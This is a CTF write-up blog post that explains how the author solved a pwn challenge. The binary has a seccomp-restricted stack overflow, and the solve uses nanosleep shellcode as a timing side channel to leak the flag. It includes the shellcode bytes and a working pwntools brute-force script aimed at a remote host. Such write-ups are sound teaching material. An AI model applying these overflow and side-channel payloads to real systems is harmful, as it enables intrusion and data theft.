---
layout: post
title: Weird chall
date: 2020-11-30
classes: wide
tags:
  - Userspace
  - Exploitation
--- 
<pre style="font-size: 0.6rem; text-align: center"> 
                                   ..                         ..                                    
                                  $$$$                       $$$$                                   
                              aaaaaaaaaaa                aaaaaaaaaaa                                
                            ccKc':olcccldkKN           ccKc':olcccldkKN                             
                           cXx'aaaaaaaaaa,lON         cXx'aaaaaaaaaa,lON                            
                           0caaaaaaaaaaaa'ckN         0caaaaaaaaaaaa'ckN                            
                           K:aaaaaaaaaa,cxKN           K:aaaaaaaaaa,cxKN                            
                            aaaaaaaaa'oKXKO             aaaaaaaaa'oaaa                              
                               ''Od,;c:'aa    aaaaaaa  ,co:,lxl;x''                                 
                                 NN0l'aaaaa,:loddddddlc;'aaaaa'dX                                   
                                0l'aaa'cdOXN   K0XN   NKko;aaaa;xX                                  
                               Xd,aaa,o0N      Ndcx0       Xkcaaaa:O                                
                              XlaaaalK         Xc,ck         Nk;aaa,kN                              
                             Xoaaa,xN          Xc';x           Kcaaa,O                              
                            Nx'aa'xN           Xc':k            Kcaaa:K                             
                            KcaaalX            No;lO             O,aaaxN                            
                            O,aa'x             Kl;ckNNNNNNN      XcaaalX                            
                            k'aa'k            Ndaaa;xkxdxxOKN    XlaaacX                            
                            O,aa'x             KxdxOXNNNNNN      XcaaalX                            
                            KcaaalX                              O,aaax                             
                            Nx'aa'xN                            Kcaaa:0                             
                             Xoaaa,xN                          Klaaa,O                              
                              Xlaaa'oK                       NO:aaa,kN                              
                               Xd,aaa,dKN                  XOc'aaa:ON                               
                                N0l'aaa'cxOXN          NKko;aaaa,dX                                 
                                  NOcaaaaaa,:lodxxxddoc;'aaaaa'oK                                   
                                   Kcaaa''aaaaaaaaaaaaaaaa'aaaadX                                   
                                  Nx'aa:OKkdolc::::::cldxOKk,aa;O                                   
                                   XOddK                 NOdx0N                                     
</pre>

---

This was a pwn challenge finally rated with 428 points in DEKRA CTF.
They just give you a binary called challenge.

The instructions said:

> This is a slightly different challenge.

---

## First run

When we first run the binary we get:

> -____-

Okey, weird. We can try some arguments but same response always.

Time to fire up Cutter!

## First look

When we open it with Cutter we get the following information:

![](/./assets/imgs/weird-dashboard.png)

Almost everything disabled and not stripped so let's search for the main function.

![](/./assets/imgs/weird-main.png)

Looking at the first block we can see why that face was displayed. It's trying to open **flag.txt** and if the open isn't successful, print something (the face) and exit. 

We can create a flag.txt file where we are executing the binary to avoid that exit so let's do that and run it again:

> Exploit me (it is an easy bof)... the flag is @ 0x7ffc3e892e60...

Nice, now we get a different result. Let's proceed with the big function: 

![](/./assets/imgs/weird-big1.png)

First, we have a **fgets** that reads from the flag.txt opened from before.

We discovered something important here: **the contents of the flag.txt are loaded into the program's memory.**

Then it prints that string we saw before and, as it states, the address where that previous fgets put the contents of flag.txt

After that, a ton of seccomp rules. 

![](/./assets/imgs/weird-longmain.png)

>I actually looked for each of the syscalls during the competition but when reading about seccomp I found this amazing tool called [seccomp-tools](https://github.com/david942j/seccomp-tools) that makes the work of analyzing seccomp rules so easy

We execute seccomp-tools against the binary and we get:

```bash
Exploit me (it is an easy bof)... the flag is @ 0x7ffcb9cc44b0...
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
 0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
 0006: 0x15 0x04 0x00 0x00000005  if (A == fstat) goto 0011
 0007: 0x15 0x03 0x00 0x00000008  if (A == lseek) goto 0011
 0008: 0x15 0x02 0x00 0x00000023  if (A == nanosleep) goto 0011
 0009: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0011
 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

So it looks like we can only execute the following syscalls:

* read
* fstat
* lseek
* nanosleep
* exit
* exit_group

---

Last part, a simple **scanf**:

![](/./assets/imgs/weird-finalmain.png)

It doesn't have limitations so **we can write as many bytes as we want**. Checking `var_40h`, we can see it is at `rbp - 0x40` so after writing 0x40 bytes we can make a buffer overflow.

---

We can also see that a jumper function exists with this simple code:

![](/./assets/imgs/weird-jumper.png)

This is obviously for us to redirect the execution to the stack.

## What now?

We know we have the contents of the flag loaded into the memory so we can just print the string and we are done. Easy challenge, right? Well, not that easy. Do you remember that seccomp part? We can't execute any syscall different from the ones from before. That means we can't write anything to stdout.

I actually spent a couple of hours until I had an idea. I remember a trick from blind SQL injections where you use some sort of delay to check if the SQL was executed. If the browser takes x time to respond, the SQL was valid. If not, the answer comes as soon as always.

As we can see, we have access to the nanosleep call so we can stop the execution as much as we want.

## The exploit

The exploit consists of redirecting the execution to the stack and then execute some assembly to check whether each of the chars in the flag string matches one we are sending. If they match, halt the execution for 5 seconds, for example.

First, let's write the assembly.

We have to load one byte from the address and then compare it with one character we send. If it doesn't match, exit the program. Let's write that first.

> When debugging the code, I noticed that the register r13 contained the address of the flag so no need to actually use the one displayed when executed

```
movzx  eax,BYTE PTR [r13 + n]
cmp    al, my_char
jne    0x40120b
```

> That address is the one of the `mov edi, 0` in the main function that it's followed by the `call exit`.

In our code, we will increase the **n** so we access the first item, the second, etc. in the flag and **my_char** for each of the printable characters.

Then, what if they are the same? Call nanosleep. I'm not really used to write assembly and I've never used that syscall. By googling 'nanosleep syscall x64' I found that it receives 2 structs so I thought about reading how others used that.

I found [this script](https://packetstormsecurity.com/files/142410/Linux-x86-64-Reverse-Shell-Shellcode.html) that uses nanosleep so I used that part for my assembly.

```
xor    rsi,rsi
push   rsi
push   0x3
push   rsp
pop    rdi
push   0x23
pop    rax
syscall
jmp    0x40120b
```

When testing it, it worked partially. I got `DEKRA{4ss` and after some time `!}`. Something wasn't working. 

Well, remember the program reads using scanf? Scanf cuts the input if it founds a **whitespace**

> %s. String of characters. This will read subsequent characters until a whitespace is found (whitespace characters are considered to be blank, newline and tab).

Can you spot it? It stopped working on the 10th char. That's \n, new line. So, my solution was to increment the starting address by something so we can dump more chars, for example, 5.

```
add r13, 0x5
```

All done! Let's crack it.

## Pwn all the things

Let's assume that the flag is going to be 10 bytes long. If it isn't, there is no problem because this is just a start point.

Now, printable characters. They go from **!** (32) to **~** (126) so that's what we are trying.

```python
from pwn import *
import time
import sys

for i in range(10):
    for j in range(32, 127):
        #p = process('./challenge')
        p = remote('remote_ip', remote_port)
        # gdb.attach(p.pid, '''
        # b *main+552
        # c
        # ''')
        p.clean()
```

I'm going to use the famous [defuse.ca](https://defuse.ca/online-x86-assembler.htm) to generate the bytes from the assembly

``` python
        shellcode = b"\x49\x83\xC5\x05" + b"\x41\x0f\xb6\x45"+ chr(i).encode() + b"\x3c" + chr(j).encode() + b"\x0f\x85\xf6\x11\x40\x00\x48\x31\xf6\x56\x6a\x03\x54\x5f\x6a\x23\x58\x0f\x05\xe9\xe4\x11\x40\x00"

        payload = b'A' * 0x48 + p64(0x4011c4) + shellcode

        start_time = time.time()
        p.sendline(payload)
        p.recvall()
        aprox = time.time() - start_time

        if aprox > 2:
            with open('success', 'a+') as file:
                file.write(chr(j))
                if chr(j) == '}':
                    sys.exit()
                break
```

After some time, the program started to hang on some characters and they were written to the file. Finally, I got:

> {4ss3mbLY

If we add 5 more bytes to the r13 register, we get:

> mbLY!}

Knowing that the flag started with DEKRA give us the final flag:

> DEKRA{4ss3mbLY!}

Pwned!

---

*I know that assembly can be upgraded and that there are ways to dump the flag just in 1 execution but I explain here my thinking process. It's not, by far, a final good solution but that's not the purpose of these writeups. I just try to explain the process of how I manage to get the solution*